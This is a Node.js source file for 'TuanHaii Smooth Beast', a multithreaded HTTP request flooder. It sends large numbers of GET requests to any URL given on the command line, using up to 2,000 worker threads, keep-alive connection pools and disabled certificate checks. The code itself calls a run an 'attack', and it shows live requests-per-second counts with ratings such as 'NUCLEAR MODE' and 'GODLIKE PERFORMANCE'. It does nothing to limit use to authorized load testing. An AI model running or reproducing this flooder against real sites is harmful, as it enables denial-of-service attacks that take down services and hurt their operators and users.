const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const figlet = require('figlet');
const chalk = require('chalk');
const gradient = require('gradient-string');
const os = require('os');

class SuperSmoothBlaster {
    constructor() {
        this.statsLine = 0;
        this.systemInfo = this.analyzeSystem();
        this.workersReady = 0;
        this.totalWorkers = 0;
        this.statsStarted = false;
        this.workerStats = new Map();
    }

    analyzeSystem() {
        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        const cpuCores = os.cpus().length;
        
        const memoryPerThread = 8 * 1024 * 1024; // 8MB per thread
        const maxThreadsByMemory = Math.floor(freeMemory * 0.8 / memoryPerThread);
        const maxThreadsByCPU = cpuCores * 6; // 6x CPU cores for I/O intensive
        
        const optimalThreads = Math.min(maxThreadsByMemory, maxThreadsByCPU, 2000);
        
        return {
            totalMemory,
            freeMemory,
            cpuCores,
            optimalThreads,
            memoryPerThread,
            maxSafeThreads: Math.floor(freeMemory * 0.9 / memoryPerThread)
        };
    }

    async createBanner() {
        console.clear();
        
        const banner = figlet.textSync('TuanHaii', {
            font: 'ANSI Shadow',
            horizontalLayout: 'default'
        });
        
        const subtitle = figlet.textSync('SMOOTH BEAST', {
            font: 'Small',
            horizontalLayout: 'default'
        });
        
        console.log(gradient.rainbow.multiline(banner));
        console.log(gradient.instagram.multiline(subtitle));
        
        console.log(gradient.pastel('⚡ ZERO LAG') + ' | ' + 
                   gradient.teen('🎯 SMOOTH AS SILK') + ' | ' + 
                   gradient.mind('🚀 THREAD MASTER'));
        console.log('');
    }

    displaySystemInfo() {
        const { totalMemory, freeMemory, cpuCores, optimalThreads, maxSafeThreads } = this.systemInfo;
        
        console.log(chalk.cyan.bold('🖥️  SYSTEM ANALYSIS'));
        console.log(chalk.white('━'.repeat(70)));
        console.log(chalk.green('Total RAM:       ') + gradient.fruit((totalMemory / 1024 / 1024 / 1024).toFixed(2) + ' GB'));
        console.log(chalk.yellow('Available RAM:   ') + gradient.passion((freeMemory / 1024 / 1024 / 1024).toFixed(2) + ' GB'));
        console.log(chalk.blue('CPU Cores:       ') + gradient.cristal(cpuCores.toString()));
        console.log(chalk.magenta('Optimal Threads: ') + gradient.rainbow(optimalThreads.toString()));
        console.log(chalk.cyan('Max Safe Threads:') + gradient.instagram(maxSafeThreads.toString()));
        console.log('');
    }

    async showThreadInitialization(totalThreads) {
        console.log(chalk.cyan.bold('🧵 INITIALIZING THREAD POOL'));
        console.log(chalk.white('━'.repeat(70)));
        
        // Reserve space for progress
        const progressLine = process.stdout.rows - 15;
        this.totalWorkers = totalThreads;
        
        return {
            update: (readyCount) => {
                const progress = (readyCount / totalThreads * 100);
                const progressBar = this.createProgressBar(readyCount, totalThreads, 50);
                
                process.stdout.write(`\x1b[${progressLine}H`);
                process.stdout.write(`\x1b[K${chalk.yellow('Threads Ready:')} ${chalk.white(readyCount.toString().padStart(4))}/${chalk.white(totalThreads.toString().padStart(4))} ${progressBar}\n`);
                process.stdout.write(`\x1b[K${chalk.cyan('Status:      ')} ${this.getInitStatus(progress)}\n`);
                process.stdout.write(`\x1b[K${chalk.green('Memory Allocated:')} ${gradient.mind(((readyCount * this.systemInfo.memoryPerThread) / 1024 / 1024).toFixed(1) + ' MB')}\n`);
            },
            complete: () => {
                process.stdout.write(`\x1b[${progressLine}H`);
                process.stdout.write(`\x1b[K${chalk.green('✅ All threads initialized successfully!')}\n`);
                process.stdout.write(`\x1b[K${chalk.cyan('🚀 Starting attack in 3 seconds...')}\n`);
                process.stdout.write(`\x1b[K\n`);
            }
        };
    }

    getInitStatus(progress) {
        if (progress < 25) return gradient.vice('🔄 Spawning workers...');
        else if (progress < 50) return gradient.atlas('⚙️  Configuring connections...');
        else if (progress < 75) return gradient.pastel('🔗 Establishing HTTP pools...');
        else if (progress < 100) return gradient.rainbow('⚡ Finalizing setup...');
        else return gradient.instagram('✅ Ready to blast!');
    }

    displayTargetInfo(url, requests, delay, threads, actualThreads) {
        console.log(chalk.cyan.bold('🎯 MISSION CONFIGURATION'));
        console.log(chalk.white('━'.repeat(70)));
        console.log(chalk.green('Target:          ') + gradient.rainbow(url));
        console.log(chalk.yellow('Total Requests:  ') + gradient.fruit(requests.toLocaleString()));
        console.log(chalk.magenta('Delay:           ') + gradient.passion(delay + 'ms'));
        console.log(chalk.blue('Requested Threads:') + gradient.cristal(threads.toString()));
        console.log(chalk.red('Optimized Threads:') + gradient.instagram(actualThreads.toString()));
        console.log(chalk.cyan('Req/Thread:      ') + gradient.mind(Math.floor(requests / actualThreads).toLocaleString()));
        console.log('');
        
        // Reserve space for live stats
        console.log(chalk.cyan.bold('📊 LIVE PERFORMANCE MONITOR'));
        console.log(chalk.white('━'.repeat(70)));
        console.log(''); // Success line
        console.log(''); // Failed line  
        console.log(''); // RPS line
        console.log(''); // Runtime line
        console.log(''); // Progress line
        console.log(''); // Memory usage
        console.log(''); // Performance indicator
        console.log(''); // Thread status
        
        this.statsLine = process.stdout.rows - 10;
    }

    updateStats(stats) {
        if (!this.statsStarted) return; // Don't update until all threads ready
        
        const { success, failed, rps, runtime, total, memoryUsage, activeThreads } = stats;
        const completed = success + failed;
        const progress = total > 0 ? (completed / total * 100).toFixed(1) : 0;
        const successRate = completed > 0 ? (success / completed * 100).toFixed(1) : 0;
        
        process.stdout.write(`\x1b[${this.statsLine}H`);
        
        // Success line
        process.stdout.write(`\x1b[K${chalk.green('Success      ')} ${gradient.summer(success.toLocaleString().padStart(10))} ${chalk.gray('(' + successRate + '%)')}\n`);
        
        // Failed line
        process.stdout.write(`\x1b[K${chalk.red('Failed       ')} ${gradient.vice(failed.toLocaleString().padStart(10))}\n`);
        
        // RPS line with smooth color transition
        let rpsGradient = gradient.fruit;
        if (rps > 10000) rpsGradient = gradient.instagram;
        else if (rps > 5000) rpsGradient = gradient.rainbow;
        else if (rps > 2000) rpsGradient = gradient.passion;
        else if (rps > 1000) rpsGradient = gradient.pastel;
        
        process.stdout.write(`\x1b[K${chalk.yellow('Rq/s         ')} ${rpsGradient(rps.toLocaleString().padStart(10))}\n`);
        
        // Runtime line  
        process.stdout.write(`\x1b[K${chalk.cyan('Runtime      ')} ${gradient.mind(runtime.toString().padStart(9))}s\n`);
        
        // Progress with ETA
        const eta = rps > 0 ? Math.floor((total - completed) / rps) : 0;
        const progressBar = this.createProgressBar(completed, total);
        process.stdout.write(`\x1b[K${chalk.blue('Progress     ')} ${progressBar} ${chalk.gray('ETA: ' + eta + 's')}\n`);
        
        // Memory usage
        const memUsedGB = (memoryUsage / 1024 / 1024 / 1024).toFixed(2);
        const memUsedPercent = ((memoryUsage / this.systemInfo.totalMemory) * 100).toFixed(1);
        process.stdout.write(`\x1b[K${chalk.magenta('Memory       ')} ${gradient.cristal(memUsedGB + ' GB')} ${chalk.gray('(' + memUsedPercent + '%)')}\n`);
        
        // Performance indicator
        let perfText = this.getPerformanceText(rps);
        process.stdout.write(`\x1b[K${perfText}\n`);
        
        // Thread status
        process.stdout.write(`\x1b[K${chalk.white('Active Threads:')} ${gradient.teen(activeThreads.toString())}/${gradient.teen(this.totalWorkers.toString())}\n`);
    }

    getPerformanceText(rps) {
        if (rps > 15000) return gradient.instagram('🔥 NUCLEAR MODE! ') + chalk.white(`${rps.toLocaleString()} RPS`);
        else if (rps > 10000) return gradient.rainbow('⚡ INSANE SPEED! ') + chalk.white(`${rps.toLocaleString()} RPS`);
        else if (rps > 5000) return gradient.passion('🚀 BLAZING FAST! ') + chalk.white(`${rps.toLocaleString()} RPS`);
        else if (rps > 2000) return gradient.pastel('💨 HIGH SPEED! ') + chalk.white(`${rps.toLocaleString()} RPS`);
        else if (rps > 500) return gradient.atlas('📈 GAINING SPEED... ') + chalk.white(`${rps.toLocaleString()} RPS`);
        else return gradient.fruit('🌱 WARMING UP... ') + chalk.white(`${rps.toLocaleString()} RPS`);
    }

    createProgressBar(current, total, width = 50) {
        const percentage = Math.min(current / total, 1);
        const filled = Math.floor(percentage * width);
        const empty = width - filled;
        
        const filledBar = '█'.repeat(filled);
        const emptyBar = '░'.repeat(empty);
        
        const coloredBar = gradient.rainbow(filledBar) + chalk.gray(emptyBar);
        return `${coloredBar} ${chalk.white((percentage * 100).toFixed(1))}%`;
    }

    calculateOptimalThreads(requestedThreads) {
        const { maxSafeThreads, optimalThreads } = this.systemInfo;
        
        if (requestedThreads <= 0) {
            return optimalThreads;
        }
        
        if (requestedThreads > maxSafeThreads) {
            console.log(chalk.yellow(`⚠️  Requested ${requestedThreads} threads, optimizing to ${maxSafeThreads} for stability`));
            return maxSafeThreads;
        }
        
        return requestedThreads;
    }

    async showCompletion(stats) {
        const { success, failed, runtime, total, avgRps, peakRps } = stats;
        const successRate = total > 0 ? ((success / total) * 100).toFixed(2) : 0;
        
        console.clear();
        
        const completeBanner = figlet.textSync('COMPLETE!', {
            font: 'ANSI Shadow',
            horizontalLayout: 'default'
        });
        
        console.log(gradient.summer.multiline(completeBanner));
        
        console.log(chalk.cyan.bold('\n🎉 SMOOTH MISSION ACCOMPLISHED!'));
        console.log(chalk.white('━'.repeat(60)));
        
        console.log(chalk.green('✅ Success:       ') + gradient.summer(success.toLocaleString().padStart(12)));
        console.log(chalk.red('❌ Failed:        ') + gradient.vice(failed.toLocaleString().padStart(12)));
        console.log(chalk.yellow('⚡ Average RPS:   ') + gradient.rainbow(avgRps.toLocaleString().padStart(12)));
        console.log(chalk.magenta('🔥 Peak RPS:      ') + gradient.instagram(peakRps.toLocaleString().padStart(12)));
        console.log(chalk.cyan('⏱️  Total Time:    ') + gradient.mind(runtime.toString().padStart(11)) + 's');
        console.log(chalk.blue('📊 Success Rate:  ') + gradient.cristal(successRate.padStart(10)) + '%');
        
        let rating = this.getPerformanceRating(avgRps);
        console.log('\n' + rating);
        console.log('\n' + gradient.rainbow('Thank you for using TuanHaii Smooth Beast! 🚀✨'));
        
        process.stdout.write('\x1b[?25h');
    }

    getPerformanceRating(avgRps) {
        if (avgRps > 15000) return gradient.instagram('🏆 GODLIKE PERFORMANCE!');
        else if (avgRps > 10000) return gradient.rainbow('🥇 LEGENDARY PERFORMANCE!');
        else if (avgRps > 5000) return gradient.passion('🥈 EPIC PERFORMANCE!');
        else if (avgRps > 2000) return gradient.pastel('🥉 EXCELLENT PERFORMANCE!');
        else return gradient.atlas('📈 GOOD PERFORMANCE!');
    }

    showUsage() {
        console.clear();
        
        console.log(gradient.vice('❌ INVALID USAGE!\n'));
        console.log(chalk.yellow('📖 USAGE:'));
        console.log('   node blaster.js <URL> <REQUESTS> <DELAY_MS> [THREADS]\n');
        console.log(chalk.green('📌 EXAMPLES:'));
        console.log('   node blaster.js https://httpbin.org/ip 10000 0 0      # Auto threads');
        console.log('   node blaster.js https://httpbin.org/get 5000 10 100   # 100 threads');
        process.exit(1);
    }
}

// Enhanced Worker with ready signal
if (!isMainThread) {
    const { url, requestCount, delay, workerId } = workerData;
    let success = 0;
    let failed = 0;
    
    // Create optimized axios instance
    const axiosInstance = axios.create({
        timeout: 15000,
        maxRedirects: 3,
        headers: {
            'User-Agent': `TuanHaii-SmoothBeast/${workerId}`,
            'Accept': '*/*',
            'Connection': 'keep-alive'
        },
        httpAgent: new (require('http')).Agent({
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 100,
            maxFreeSockets: 20,
            timeout: 15000
        }),
        httpsAgent: new (require('https')).Agent({
            keepAlive: true,
            keepAliveMsecs: 1000,
            maxSockets: 100,
            maxFreeSockets: 20,
            rejectUnauthorized: false,
            timeout: 15000
        })
    });

    // Signal that worker is ready
    parentPort.postMessage({ type: 'ready', workerId });

    // Wait for start signal
    parentPort.on('message', async (msg) => {
        if (msg.type === 'start') {
            await sendRequests();
        }
    });

    async function sendRequests() {
        for (let i = 0; i < requestCount; i++) {
            try {
                await axiosInstance.get(url);
                success++;
            } catch (error) {
                failed++;
            }
            
            // Send stats update every 10 requests to reduce message overhead
            if (i % 10 === 0 || i === requestCount - 1) {
                parentPort.postMessage({ 
                    type: 'stats', 
                    workerId, 
                    success, 
                    failed 
                });
            }
            
            if (delay > 0) {
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        parentPort.postMessage({ type: 'complete', workerId });
    }

    return;
}

// Main thread with smooth initialization
async function main() {
    const blaster = new SuperSmoothBlaster();
    const args = process.argv.slice(2);
    
    if (args.length < 3 || args.length > 4) {
        blaster.showUsage();
        return;
    }

    const [url, totalRequests, delay, threads = '0'] = args;
    
    if (!url || (!url.startsWith('http://') && !url.startsWith('https://'))) {
        console.log(chalk.red('❌ Invalid URL!'));
        blaster.showUsage();
        return;
    }
    
    const requestCount = parseInt(totalRequests);
    const delayMs = parseInt(delay);
    const requestedThreads = parseInt(threads);

    if (isNaN(requestCount) || requestCount <= 0 ||
        isNaN(delayMs) || delayMs < 0 ||
        isNaN(requestedThreads) || requestedThreads < 0) {
        blaster.showUsage();
        return;
    }

    process.stdout.write('\x1b[?25l');
    
    await blaster.createBanner();
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    blaster.displaySystemInfo();
    
    const actualThreads = blaster.calculateOptimalThreads(requestedThreads);
    blaster.displayTargetInfo(url, requestCount, delayMs, requestedThreads, actualThreads);

    // Initialize threads with progress tracking
    const initProgress = await blaster.showThreadInitialization(actualThreads);
    
    let totalSuccess = 0;
    let totalFailed = 0;
    let peakRps = 0;
    let completedWorkers = 0;
    let startTime = null;
    const workers = [];
    const requestsPerThread = Math.floor(requestCount / actualThreads);

    // Create workers and track initialization
    for (let i = 0; i < actualThreads; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                url,
                requestCount: requestsPerThread,
                delay: delayMs,
                workerId: i + 1
            }
        });

        worker.on('message', (data) => {
            if (data.type === 'ready') {
                blaster.workersReady++;
                initProgress.update(blaster.workersReady);
                
                // All workers ready - start attack
                if (blaster.workersReady === actualThreads) {
                    initProgress.complete();
                    
                    setTimeout(() => {
                        // Clear initialization UI and start stats
                        console.clear();
                        blaster.createBanner().then(() => {
                            blaster.displayTargetInfo(url, requestCount, delayMs, requestedThreads, actualThreads);
                            blaster.statsStarted = true;
                            startTime = Date.now();
                            
                            // Start all workers
                            workers.forEach(w => w.postMessage({ type: 'start' }));
                            
                            // Start smooth stats updates
                            startStatsUpdates();
                        });
                    }, 3000);
                }
            } else if (data.type === 'stats') {
                blaster.workerStats.set(data.workerId, { success: data.success, failed: data.failed });
            } else if (data.type === 'complete') {
                completedWorkers++;
                if (completedWorkers === actualThreads) {
                    finishMission();
                }
            }
        });

        workers.push(worker);
    }

    function startStatsUpdates() {
        const refreshInterval = setInterval(() => {
            if (completedWorkers >= actualThreads) {
                clearInterval(refreshInterval);
                return;
            }
            
            // Aggregate stats from all workers
            totalSuccess = 0;
            totalFailed = 0;
            
            blaster.workerStats.forEach(stats => {
                totalSuccess += stats.success;
                totalFailed += stats.failed;
            });
            
            const runtime = Math.floor((Date.now() - startTime) / 1000);
            const rps = runtime > 0 ? Math.floor((totalSuccess + totalFailed) / runtime) : 0;
            const memoryUsage = process.memoryUsage().heapUsed;
            
            if (rps > peakRps) peakRps = rps;
            
            blaster.updateStats({
                success: totalSuccess,
                failed: totalFailed,
                rps: rps,
                runtime: runtime,
                total: requestCount,
                memoryUsage: memoryUsage,
                activeThreads: actualThreads - completedWorkers
            });
        }, 50); // 20fps smooth updates
    }

    function finishMission() {
        const endTime = Date.now();
        const totalTime = Math.floor((endTime - startTime) / 1000);
        const avgRps = totalTime > 0 ? Math.floor((totalSuccess + totalFailed) / totalTime) : 0;
        
        setTimeout(async () => {
            await blaster.showCompletion({
                success: totalSuccess,
                failed: totalFailed,
                runtime: totalTime,
                total: requestCount,
                avgRps: avgRps,
                peakRps: peakRps
            });
        }, 1000);
    }

    process.on('SIGINT', () => {
        process.stdout.write('\x1b[?25h');
        process.exit();
    });
}

if (isMainThread) {
    main();
}